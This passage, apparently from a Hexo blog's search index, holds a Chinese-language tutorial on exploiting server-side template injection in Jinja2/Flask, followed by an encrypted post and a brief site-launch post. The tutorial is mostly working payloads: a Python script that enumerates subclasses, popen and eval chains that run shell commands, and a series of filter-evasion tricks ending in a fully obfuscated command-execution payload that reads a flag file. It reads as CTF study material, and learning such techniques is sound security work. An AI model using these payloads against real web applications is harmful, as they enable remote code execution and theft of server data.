class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>可以获取类的所有子类的元组<br>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>重载子类，获取子类初始化的属性。</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>就比如：<code>os._wrap_close.__init__.__globals__</code>，可以获取到os中的一些函数，进行文件读取</p><h1 id="3-SSTI语句构造"><a href="#3-SSTI语句构造" class="headerlink" title="3.SSTI语句构造"></a>3.SSTI语句构造</h1><p>第一步，拿到当前类，也就是用__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>第二步，拿到基类，这里可以用__base__，也可以用__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>第三步，拿到基类的子类，用<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, <br></code></pre></td></tr></table></figure><p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类<br>大多数利用的是<code>os._wrap_close</code>这个类，我们这里可以用一个简单脚本来寻找它对应的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>首先<br>先调用它的__init__方法进行初始化类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>此时就可以去进行RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>它的payload是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTI常见的绕过方式"><a href="#4-SSTI常见的绕过方式" class="headerlink" title="4.SSTI常见的绕过方式"></a>4.SSTI常见的绕过方式</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过  ."></a>绕过  .</h2><p>当.被ban时，有以下几种绕过方式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1、用[]代替.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、用attr()过滤器绕过</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过 _"></a>绕过 _</h2><p>当<code>_</code>被ban时，有以下几种绕过方式</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1、通过list获取字符列表，然后用pop来获取_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、可以通过字符编码的方式进行绕过，举个16进制编码例子 可以编码绕过 python解析器支持 hex ，unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>使用{%set%}构造下划线<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>小标按照实际情况写<br></code></pre></td></tr></table></figure><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过 []"></a>绕过 []</h2><p>经常有中括号被ban的情况出现，这个时候可以使用<code>pop</code>或<code>__getitem__()</code>代替索引中的&#96;[]，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## 绕过{{}}有时候为了防止SSTI，可能程序员会ban掉{{，这个时候我们可以利用jinja2的语法，用{%来进行RCE，举个例子我们平常使用的payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>修改后的payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>也可以借助for循环和if语句来执行命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过单引号双引号-传参绕过"><a href="#绕过单引号双引号-传参绕过" class="headerlink" title="绕过单引号双引号   传参绕过"></a>绕过单引号双引号   传参绕过</h2><p>过滤了单、双引号，有两种方法绕过</p><p>request绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()绕过</p><p>先找出chr函数位置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}拼接绕过   适合大部分过滤<h2 id="绕过args"><a href="#绕过args" class="headerlink" title="绕过args"></a>绕过args</h2><p>当使用args的方法绕过<code>&#39;</code>和<code>&quot;</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异，示例如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>使用{%set%}拼接绕过<h2 id="绕过数字"><a href="#绕过数字" class="headerlink" title="绕过数字"></a>绕过数字</h2><p>有时候可能会遇见数字<code>0-9</code>被ban的情况，这个时候我们可以通过count来得到数字，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml">  #获得字典拼接后字符串的长度</span><br></code></pre></td></tr></table></figure><h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><p>有时候可能遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，我们这个时候通常使用的绕过方式是使用join拼接从而实现绕过，举个例子</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br></code></pre></td></tr></table></figure><h1 id="SSTI实战"><a href="#SSTI实战" class="headerlink" title="SSTI实战"></a>SSTI实战</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">目的<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br>payload:<br>&#123;% <span class="hljs-built_in">set</span> s = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> si = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sb = dict(<span class="hljs-attribute">aaaaaaaaaaaaaaaaaa</span>=a) | join | count %&#125;<br>&#123;% <span class="hljs-built_in">set</span> <span class="hljs-attribute">pop</span>=dict(pop=a)|join%&#125;<br>&#123;% <span class="hljs-built_in">set</span> xiahuaxian = (lipsum | string | list) | attr(pop)(sb) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> a = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">glo</span>=a, <span class="hljs-attribute">bals</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> b = dict(<span class="hljs-attribute">o</span>=a, <span class="hljs-attribute">s</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = dict(<span class="hljs-attribute">po</span>=a, <span class="hljs-attribute">pen</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> d = dict(<span class="hljs-attribute">re</span>=a, <span class="hljs-attribute">ad</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> e = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">get</span>=a, <span class="hljs-attribute">item</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> f = (xiahuaxian, xiahuaxian, dict(<span class="hljs-attribute">buil</span>=a, <span class="hljs-attribute">tins</span>=a) | join, xiahuaxian, xiahuaxian) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ch = dict(<span class="hljs-attribute">ch</span>=a, <span class="hljs-attribute">r</span>=a) | join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> chh = lipsum | attr(a) | attr(e)(f) | attr(e)(ch) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> cmd = (dict(<span class="hljs-attribute">ca</span>=a, <span class="hljs-attribute">t</span>=a) | join, chh(s), chh(si), dict(<span class="hljs-attribute">ap</span>=a, <span class="hljs-attribute">p</span>=a) | join, chh(si), dict(<span class="hljs-attribute">fl</span>=a, <span class="hljs-attribute">ag</span>=a) | join) | join %&#125;<br>&#123;&#123; lipsum | attr(a) | attr(e)(b) | attr(c)(cmd) | attr(d)() &#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>问自己</title>
    <link href="/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/"/>
    <url>/2025/01/19/%E9%97%AE%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ceab957815d1b4c83f31e46006ce80c287aaafac373a6b841e7e6304f0abbcc0">7389a4e37e9dabc8af72228f567f583b1f9ba4b4aa0b937c90aaff86783f2f4cdc7fe0a2e060dc0fb69e0cfed97c5b2b02307e944f85197c10783a2e08b2ebab38f98c0635854736a7d4db8057147550382529547668fab013ade34f08eb873f4dfe405f4d5985ee706239b30f02b95c1e5cfe6be76c8cc844a2ce36f2afb02b1e4370944671f31986fac2146df9065a82e0db0d7d7754d95577499610e7d55b4db5e048307c3a119d14afa15db89d7796106ec767db66ecbf296ccd51ebec5b85d06521eb6672e74ebdb6b080b9ddd2079dd70a60c93ae9c6c31b3e4dc1019e48826abb08a06e7906f06427791b012adad6bfb36447f3206a6c421d39dffb2ec14024d056d0fc713c7ec6b790b8bb529c7b580fdb9ef82693bac3aa8aa2fc2d0bbbe11e3c418272b5cecbea4324cdbf9641e7fd455c2e10fc650df7f1a67bbe3003c435abcfbaafa6fb651c663806b571c78e9f8d45769d20ee999b4ed90585a9e69543e488880081374a78c64c4e984c24f71c66ff351882845be8a65f22c3569748c41e52a544e54a5c2a0c33c599217f07aea603c7a56d131ecb8593faa7f9654e2a6edc3ad74c09b04deab036ddb41dd202149ed60c8acc4eaa4a868f1d009df742e4ea103f8838074a4180ad038f09e7db4b546d7772190cff232c4c80dcad18f5d930d007afa2bb1eefceffa183b2b765009431851485d4b71d2194696af02dbb65e20caecdcb1c9c4c219de964d4bc57e8db004bf9e9f4abaa87c63bcf8f25c1b3bc403374090a6ffc4264d9ebc250a382bdabbb8f8889c946ee677b0f682acc22da1d847cc8faa3a30783db44ff527f1173fe78bf19587039e57a3a5d71312b5290632ef680733a6b15762e465f8341d5aa86f68624d9c1d135a186139c6b319f297b61c0ce963c238976a592703a2fbf20b3ec22b9f510a4fa39eefcb37fbd6db69ccf47bd3c14ad681060738b60ba78e67940feb5baff30b9830306f74747010f81c7fad05874109ee42f24c5a8697c3cc57bc50fb20449a2397d5cabed06e1a9944cd0a443b54b1a1116</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>目标</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开站</title>
    <link href="/2024/11/12/%E5%BC%80%E7%AB%99/"/>
    <url>/2024/11/12/%E5%BC%80%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>搭建一个小站，纪录自己的学习和分享一些东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
